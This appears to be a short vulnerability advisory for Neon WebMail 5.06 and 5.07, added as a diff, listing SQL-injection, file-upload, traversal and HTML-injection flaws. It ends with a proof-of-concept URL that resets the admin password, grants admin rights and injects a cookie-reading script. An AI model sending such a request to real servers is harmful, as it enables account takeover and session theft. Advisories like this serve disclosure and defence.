@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/20109/info
+     
+Neon WebMail is prone to multiple input-validation vulnerabilities because it fails to sanitize user-supplied input. These issues include:
+     
+- an arbitrary-file-upload vulnerability
+- an arbitrary-email-manipulation vulnerability
+- multiple SQL-injection vulnerabilities
+- an unauthorized-access vulnerability
+- multiple directory-traversal vulnerabilities
+- an HTML-injection vulnerability. 
+     
+An attacker can exploit these issues to compromise the affected application.
+     
+Versions 5.06 and 5.07 (build.200607050) are vulnerable to these issue; prior versions may also be affected.
+
+http://www.example.com/neonwebmail/updateuser?in_id=admin&in_pass=hacked&
+in_name=<script>alert(document.cookie);</script>&in_admin=1&in_showmailcount=10&
+in_usecss=1&in_autopoptime=5&in_replysign=&in_isquotation=1&in_formwidth=50&exe=update
